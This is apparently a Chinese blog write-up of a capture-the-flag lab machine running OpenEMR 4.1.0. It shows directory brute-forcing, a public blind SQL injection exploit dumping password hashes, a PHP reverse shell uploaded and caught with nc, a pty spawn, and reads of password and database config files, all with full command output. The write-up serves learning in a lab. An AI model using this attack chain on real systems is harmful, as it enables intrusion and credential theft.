<p>这里也是给自己一个提醒了，目录字典的问题一直没有考虑过，无脑使用 <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>。不过为什么 kali 中默认只有 2.3-medium 版本，而没有 big 版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.1.1.141 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.1.1.141<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/08/11 14:00:52 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index                (Status: 200) [Size: 5031]<br>/images               (Status: 301) [Size: 338] [--&gt; http://192.1.1.141/images/]<br>/css                  (Status: 301) [Size: 335] [--&gt; http://192.1.1.141/css/]<br>/js                   (Status: 301) [Size: 334] [--&gt; http://192.1.1.141/js/]<br>/vendor               (Status: 301) [Size: 338] [--&gt; http://192.1.1.141/vendor/]<br>/favicon              (Status: 200) [Size: 1406]<br>/robots               (Status: 200) [Size: 620]<br>/fonts                (Status: 301) [Size: 337] [--&gt; http://192.1.1.141/fonts/]<br>/gitweb               (Status: 301) [Size: 338] [--&gt; http://192.1.1.141/gitweb/]<br>/phpMyAdmin           (Status: 403) [Size: 59]<br>/server-status        (Status: 403) [Size: 997]<br>/server-info          (Status: 403) [Size: 997]<br>/openemr              (Status: 301) [Size: 339] [--&gt; http://192.1.1.141/openemr/]<br>Progress: 1272284 / 1273834 (99.88%)<br>===============================================================<br>2023/08/11 14:06:40 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>

<h2 id="OpenEMR-4-1-0-SQL-注入漏洞"><a href="#OpenEMR-4-1-0-SQL-注入漏洞" class="headerlink" title="OpenEMR 4.1.0 SQL 注入漏洞"></a>OpenEMR 4.1.0 SQL 注入漏洞</h2><p>发现了一个隐藏的目录 <code>/openemr</code>，访问该页面</p>
<p><img src="/pic/056df356faeed5a19a59a7aa57c0aee3_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>有两个思路，这里看到了版本信息，可以尝试搜索该版本是否存在漏洞，再一个漏洞利用不成功的话可以考虑爆破</p>
<p>先从简单的查漏洞开始：搜索 <code>OpenEMR 4.1.0</code> </p>
<p><img src="/pic/b2e17b3a33a0ef4bd6d47d7df84327d1_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>发现存在 exp，那就查看并修改其中的 url，在本地运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ python 49742.py<br><br>   ____                   ________  _______     __ __   ___ ____<br>  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  &lt;  // __ \<br> / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /<br>/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ /<br>\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/<br>    /_/<br>    ____  ___           __   _____ ____    __    _<br>   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)<br>  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /<br> / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /<br>/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike<br><br>[+] Finding number of <span class="hljs-built_in">users</span>...<br>[+] Found number of <span class="hljs-built_in">users</span>: 2<br>[+] Extracting username and password <span class="hljs-built_in">hash</span>...<br>admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8<br>medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d<br></code></pre></td></tr></table></figure>

<p>应该是自动盲注得到了用户名和密码，不过这个密码看起来有点像 hash，尝试在线工具碰撞一下</p>
<p><img src="/pic/74a7ccd8aee5b709ef1824a14aba5448_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>拿到了两个用户名密码对，<code>admin:ackbar</code>, <code>medical:medical</code></p>
<p>尝试在网站和 ftp 中分别登录</p>
<h2 id="后台上传文件-getshell"><a href="#后台上传文件-getshell" class="headerlink" title="后台上传文件 getshell"></a>后台上传文件 getshell</h2><p>网站中 admin 登录成功，ftp 中 medical 登录成功</p>
<p>网站中寻寻觅觅，找到了文件上传的入口（先在 ftp 中查看了网站目录结构，由于权限问题，ftp 中无法上传文件到网站目录）</p>
<p><img src="/pic/4e93965164248720640c5b226e75f27a_MD5.png" srcset="/img/loading.gif" lazyload></p>
<p>直接上传一个经典 php 马，然后根据路径去访问<code>http://192.1.1.141/openemr/sites/default/images/php-reverse-shell.php</code>，来 getshell</p>
<p>成功</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo nc -lvnp 443                       <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.141] 60168<br>Linux localhost.localdomain 2.6.38.8-pclos3.bfs <span class="hljs-comment">#1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686 i686 i386 GNU/Linux</span><br> 15:51:06 up 21:22,  0 <span class="hljs-built_in">users</span>,  load average: 1.00, 1.06, 1.07<br>USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=479(apache) gid=416(apache) <span class="hljs-built_in">groups</span>=416(apache)<br>sh: no job control <span class="hljs-keyword">in</span> this shell<br>sh-4.1$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>apache<br>sh-4.1$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=479(apache) gid=416(apache) <span class="hljs-built_in">groups</span>=416(apache)<br>sh-4.1$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:95:f1:6a brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.141/24 brd 192.1.1.255 scope global eth1<br>    inet6 fe80::20c:29ff:fe95:f16a/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>ip a<br>sh-4.1$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux localhost.localdomain 2.6.38.8-pclos3.bfs <span class="hljs-comment">#1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686 i686 i386 GNU/Linux</span><br><br>sh-4.1$ <span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>sh-4.1$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>

<p>ftp 中寻寻觅觅</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ ftp 192.1.1.141<br>Connected to 192.1.1.141.<br>220 ProFTPD 1.3.3d Server (ProFTPD Default Installation) [192.1.1.141]<br>Name (192.1.1.141:kali): medical<br>331 Password required <span class="hljs-keyword">for</span> medical<br>Password: <br>230 User medical logged <span class="hljs-keyword">in</span><br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; binary<br>200 Type <span class="hljs-built_in">set</span> to I<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||48953|)<br>150 Opening ASCII mode data connection <span class="hljs-keyword">for</span> file list<br>drwxr--r--   2 medical  medical      4096 Nov  5  2011 Desktop<br>drwx------   2 medical  medical      4096 Nov  5  2011 Documents<br>drwx------   2 medical  medical      4096 Oct 27  2011 Downloads<br>drwx------   2 medical  medical      4096 Jan 19  2010 Movies<br>drwx------   2 medical  medical      4096 Jan 19  2010 Music<br>drwx------   2 medical  medical      4096 Oct 27  2011 Pictures<br>drwxr-xr-x   2 medical  medical      4096 Jul 20  2011 Templates<br>drwxr-xr-x   2 medical  medical      4096 Jul 20  2011 Videos<br>drwx------   9 medical  medical      4096 Nov  5  2011 tmp<br>226 Transfer complete<br>ftp&gt; <span class="hljs-built_in">cd</span> Desktop<br>250 CWD <span class="hljs-built_in">command</span> successful<br>ftp&gt; <span class="hljs-built_in">ls</span> -liah<br>229 Entering Extended Passive Mode (|||24046|)<br>150 Opening ASCII mode data connection <span class="hljs-keyword">for</span> file list<br>drwxr--r--   2 medical  medical      4.0k Nov  5  2011 .<br>drwxr-xr-x  31 medical  medical      4.0k Nov  5  2011 ..<br>-rwxr-xr-x   1 medical  medical       265 Jul  3  2011 Get Libre Office.desktop<br>-rwxr-xr-x   1 medical  medical       229 Apr 12  2010 addlocale.desktop<br>-rwxr-xr-x   1 medical  medical       225 Apr 12  2010 drakfirewall.desktop<br>-rwxr-xr-x   1 medical  medical      1.2k Apr 12  2010 draknetcenter.desktop<br>226 Transfer complete<br>ftp&gt; <span class="hljs-built_in">cd</span> ..<br>250 CWD <span class="hljs-built_in">command</span> successful<br></code></pre></td></tr></table></figure>

<p>桌面上没东西，那就看看别的目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">ls</span> -liah<br>229 Entering Extended Passive Mode (|||43237|)<br>150 Opening ASCII mode data connection <span class="hljs-keyword">for</span> file list<br>drwxr-xr-x  31 medical  medical      4.0k Nov  5  2011 .<br>drwxr-xr-x   5 root     root         4.0k Jul 29  2020 ..<br>-rw-------   1 medical  medical      5.9k Nov  5  2011 .ICEauthority<br>-rw-------   1 medical  medical       120 Nov  5  2011 .Xauthority<br>drwx------   3 medical  medical      4.0k Nov  5  2011 .adobe<br>-rw-r--r--   1 medical  medical       193 Sep 24  2011 .bash_profile<br>-rw-rw-r--   1 medical  medical       145 Sep  6  2011 .bashrc<br>drwxr-xr-x   3 medical  medical      4.0k Nov  5  2011 .cache<br>drwx------  11 medical  medical      4.0k Nov  5  2011 .config<br>drwx------   3 medical  medical      4.0k Oct 27  2011 .dbus<br>-rwxrwxr-x   1 root     root           14 Nov  5  2011 .desktop<br>-rw-------   1 medical  medical        28 Nov  5  2011 .dmrc<br>-rw-------   1 medical  medical        16 Oct 27  2011 .esd_auth<br>drwxr-xr-x   2 medical  medical      4.0k Nov  5  2011 .fontconfig<br>drwx------   4 medical  medical      4.0k Nov  5  2011 .gconf<br>drwx------   2 medical  medical      4.0k Nov  5  2011 .gconfd<br>-rw-r-----   1 medical  medical         0 Nov  5  2011 .gksu.lock<br>drwx------   9 medical  medical      4.0k Nov  5  2011 .gnome2<br>drwx------   2 medical  medical      4.0k Jul 20  2011 .gnome2_private<br>drwx------   3 medical  medical      4.0k Oct 27  2011 .gnupg<br>-rw-rw-r--   1 medical  medical       326 Nov  5  2011 .gtk-bookmarks<br>drwxrwxr-x   2 medical  medical      4.0k Oct 27  2011 .icons<br>drwxr-xr-x   3 medical  medical      4.0k Jul 20  2011 .<span class="hljs-built_in">local</span><br>drwx------   3 medical  medical      4.0k Oct 27  2011 .macromedia<br>-rw-r--r--   1 medical  medical         0 Oct 23  2010 .mdk-menu-migrated<br>-rw-rw-r--   1 medical  medical         0 Nov  5  2011 .menu-updates.stamp<br>drwx------   4 medical  medical      4.0k Oct 27  2011 .mozilla<br>drwx------   3 medical  medical      4.0k Oct 27  2011 .mysqlgui<br>drwxr-xr-x   2 medical  medical      4.0k Oct 23  2010 .nautilus<br>drwx------   3 medical  medical      4.0k Nov  5  2011 .pki<br>drwx------   2 medical  medical      4.0k Oct 27  2011 .pulse<br>-rw-------   1 medical  medical       256 Oct 27  2011 .pulse-cookie<br>drwxrwxr-x   2 medical  medical      4.0k Jul 20  2011 .themes<br>drwx------   3 medical  medical      4.0k Jul 20  2011 .thumbnails<br>-rw-r--r--   1 medical  medical      1.9k Jul  6  2011 .xbindkeysrc<br>drwxr--r--   2 medical  medical      4.0k Nov  5  2011 Desktop<br>drwx------   2 medical  medical      4.0k Nov  5  2011 Documents<br>drwx------   2 medical  medical      4.0k Oct 27  2011 Downloads<br>drwx------   2 medical  medical      4.0k Jan 19  2010 Movies<br>drwx------   2 medical  medical      4.0k Jan 19  2010 Music<br>drwx------   2 medical  medical      4.0k Oct 27  2011 Pictures<br>drwxr-xr-x   2 medical  medical      4.0k Jul 20  2011 Templates<br>drwxr-xr-x   2 medical  medical      4.0k Jul 20  2011 Videos<br>drwx------   9 medical  medical      4.0k Nov  5  2011 tmp<br>226 Transfer complete<br>ftp&gt; <span class="hljs-built_in">cd</span> Documents<br>250 CWD <span class="hljs-built_in">command</span> successful<br>ftp&gt; <span class="hljs-built_in">ls</span> -alih<br>229 Entering Extended Passive Mode (|||35557|)<br>150 Opening ASCII mode data connection <span class="hljs-keyword">for</span> file list<br>drwx------   2 medical  medical      4.0k Nov  5  2011 .<br>drwxr-xr-x  31 medical  medical      4.0k Nov  5  2011 ..<br>-rwxr-xr-x   1 medical  medical     33.8k Nov  4  2011 OpenEMR Passwords.pdf<br>-rw-rw-r--   1 medical  medical        82 Oct 27  2011 Passwords.txt<br></code></pre></td></tr></table></figure>

<p>发现了 <code>Passwords.txt</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ <span class="hljs-built_in">cat</span> Passwords.txt       <br>PCLINUXOS MEDICAL<br>root-root<br>medical-medical<br><br><br>OPENEMR<br>admin-admin<br>medical-medical<br></code></pre></td></tr></table></figure>

<p>得到了三对密码对，既然已经 getshell 了那就直接尝试上述密码对，还根据 &#x2F;etc&#x2F;passwd 文件来缩小用户范围（也就是排除掉admin）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.1$ su medical<br>su medical<br>Password: medical<br><br>[medical@localhost /]$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>medical<br>[medical@localhost /]$ su -<br>su -<br>Password: root<br><br>su: incorrect password<br>[medical@localhost /]$ su root<br>su root<br>Password: root<br><br>su: incorrect password<br>[medical@localhost /]$ sudo -l<br>sudo -l<br>bash: sudo: <span class="hljs-built_in">command</span> not found<br>[medical@localhost /]$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>medical<br>[medical@localhost /]$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=500(medical) gid=500(medical) <span class="hljs-built_in">groups</span>=500(medical),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(<span class="hljs-built_in">users</span>),490(polkituser),501(fuse)<br>[medical@localhost /]$ <span class="hljs-built_in">ls</span> -liah /etc/passwd<br><span class="hljs-built_in">ls</span> -liah /etc/passwd<br>134072 -rw-r--r-- 1 root root 2.0K Jul 29  2020 /etc/passwd<br>[medical@localhost /]$ <span class="hljs-built_in">ls</span> -liah /etc/shadow<br><span class="hljs-built_in">ls</span> -liah /etc/shadow<br>131337 -r--r----- 1 root shadow 1.1K Jul 29  2020 /etc/shadow<br></code></pre></td></tr></table></figure>

<p>虽然 root 并不是 root 用户的密码，但是我们还是登录到了 medical 用户</p>
<p>查看家目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost ~]$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 168K<br>267486 drwxr-xr-x 31 medical medical 4.0K Nov  5  2011 ./<br>262657 drwxr-xr-x  5 root    root    4.0K Jul 29  2020 ../<br>267487 -rw-------  1 medical medical 5.9K Nov  5  2011 .ICEauthority<br>267488 -rw-------  1 medical medical  120 Nov  5  2011 .Xauthority<br>267489 drwx------  3 medical medical 4.0K Nov  4  2011 .adobe/<br>267493 -rw-r--r--  1 medical medical  193 Sep 24  2011 .bash_profile<br>267494 -rw-rw-r--  1 medical medical  145 Sep  6  2011 .bashrc<br>267495 drwxr-xr-x  3 medical medical 4.0K Nov  5  2011 .cache/<br>267515 drwx------ 11 medical medical 4.0K Nov  5  2011 .config/<br>414952 drwx------  3 medical medical 4.0K Oct 27  2011 .dbus/<br>267552 -rwxrwxr-x  1 root    root      14 Nov  4  2011 .desktop*<br>267553 -rw-------  1 medical medical   28 Nov  5  2011 .dmrc<br>267554 -rw-------  1 medical medical   16 Oct 27  2011 .esd_auth<br>414955 drwxr-xr-x  2 medical medical 4.0K Nov  4  2011 .fontconfig/<br>414961 drwx------  4 medical medical 4.0K Nov  5  2011 .gconf/<br>415106 drwx------  2 medical medical 4.0K Nov  5  2011 .gconfd/<br>267555 -rw-r-----  1 medical medical    0 Nov  5  2011 .gksu.lock<br>267556 drwx------  9 medical medical 4.0K Nov  4  2011 .gnome2/<br>267574 drwx------  2 medical medical 4.0K Jul 19  2011 .gnome2_private/<br>267575 drwx------  3 medical medical 4.0K Oct 27  2011 .gnupg/<br>267578 -rw-rw-r--  1 medical medical  326 Nov  5  2011 .gtk-bookmarks<br>267579 drwxrwxr-x  2 medical medical 4.0K Oct 27  2011 .icons/<br>267580 drwxr-xr-x  3 medical medical 4.0K Jul 19  2011 .<span class="hljs-built_in">local</span>/<br>415110 drwx------  3 medical medical 4.0K Oct 27  2011 .macromedia/<br>267603 -rw-r--r--  1 medical medical    0 Oct 22  2010 .mdk-menu-migrated<br>267604 -rw-rw-r--  1 medical medical    0 Nov  5  2011 .menu-updates.stamp<br>415118 drwx------  4 medical medical 4.0K Oct 27  2011 .mozilla/<br>415194 drwx------  3 medical medical 4.0K Oct 27  2011 .mysqlgui/<br>415199 drwxr-xr-x  2 medical medical 4.0K Oct 22  2010 .nautilus/<br>415200 drwx------  3 medical medical 4.0K Nov  5  2011 .pki/<br>415205 drwx------  2 medical medical 4.0K Oct 27  2011 .pulse/<br>267605 -rw-------  1 medical medical  256 Oct 27  2011 .pulse-cookie<br>267606 drwxrwxr-x  2 medical medical 4.0K Jul 19  2011 .themes/<br>267607 drwx------  3 medical medical 4.0K Jul 19  2011 .thumbnails/<br>267622 -rw-r--r--  1 medical medical 1.9K Jul  6  2011 .xbindkeysrc<br>267623 drwxr--r--  2 medical medical 4.0K Nov  5  2011 Desktop/<br>267628 drwx------  2 medical medical 4.0K Nov  4  2011 Documents/<br>267631 drwx------  2 medical medical 4.0K Oct 27  2011 Downloads/<br>267633 drwx------  2 medical medical 4.0K Jan 19  2010 Movies/<br>267634 drwx------  2 medical medical 4.0K Jan 19  2010 Music/<br>267635 drwx------  2 medical medical 4.0K Oct 27  2011 Pictures/<br>267637 drwxr-xr-x  2 medical medical 4.0K Jul 19  2011 Templates/<br>267638 drwxr-xr-x  2 medical medical 4.0K Jul 19  2011 Videos/<br>267639 drwx------  9 medical medical 4.0K Nov  5  2011 tmp/<br></code></pre></td></tr></table></figure>

<p>和 ftp 中看到的一致，在网站目录中找找数据库配置文件，然后用数据库密码尝试碰撞 root 密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">[medical@localhost default]$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>LBF/              edi/          images/                 statement.inc.php<br>clickoptions.txt  era/          letter_templates/<br>config.php        faxcover.txt  referral_template.html<br>documents/        faxtitle.eps  sqlconf.php<br>[medical@localhost default]$ <span class="hljs-built_in">cat</span> sqlconf.php<br><span class="hljs-built_in">cat</span> sqlconf.php<br>&lt;?php<br>//  OpenEMR<br>//  MySQL Config<br><br><span class="hljs-variable">$host</span>   = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$port</span>   = <span class="hljs-string">&#x27;3306&#x27;</span>;<br><span class="hljs-variable">$login</span>  = <span class="hljs-string">&#x27;openemr&#x27;</span>;<br><span class="hljs-variable">$pass</span>   = <span class="hljs-string">&#x27;openemr&#x27;</span>;<br><span class="hljs-variable">$dbase</span>  = <span class="hljs-string">&#x27;openemr&#x27;</span>;<br><br>//Added ability to <span class="hljs-built_in">disable</span><br>//utf8 encoding - bm 05-2009<br>global <span class="hljs-variable">$disable_utf8_flag</span>;<br><span class="hljs-variable">$disable_utf8_flag</span> = <span class="hljs-literal">false</span>;<br><br><span class="hljs-variable">$sqlconf</span> = array();<br>global <span class="hljs-variable">$sqlconf</span>;<br><span class="hljs-variable">$sqlconf</span>[<span class="hljs-string">&quot;host&quot;</span>]= <span class="hljs-variable">$host</span>;<br><span class="hljs-variable">$sqlconf</span>[<span class="hljs-string">&quot;port&quot;</span>] = <span class="hljs-variable">$port</span>;<br><span class="hljs-variable">$sqlconf</span>[<span class="hljs-string">&quot;login&quot;</span>] = <span class="hljs-variable">$login</span>;<br><span class="hljs-variable">$sqlconf</span>[<span class="hljs-string">&quot;pass&quot;</span>] = <span class="hljs-variable">$pass</span>;<br><span class="hljs-variable">$sqlconf</span>[<span class="hljs-string">&quot;dbase&quot;</span>] = <span class="hljs-variable">$dbase</span>;<br>//////////////////////////<br>//////////////////////////<br>//////////////////////////<br>//////DO NOT TOUCH THIS///<br><span class="hljs-variable">$config</span> = 1; /////////////<br>//////////////////////////<br>//////////////////////////<br>//////////////////////////<br>?&gt;<br>[medical@localhost default]$ su -<br>su -<br>Password: openemr<br><br>su: incorrect password<br></code></pre></td></tr></table></figure>

<h2 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h2><p>失败，尝试看看 SUID 文件</p>
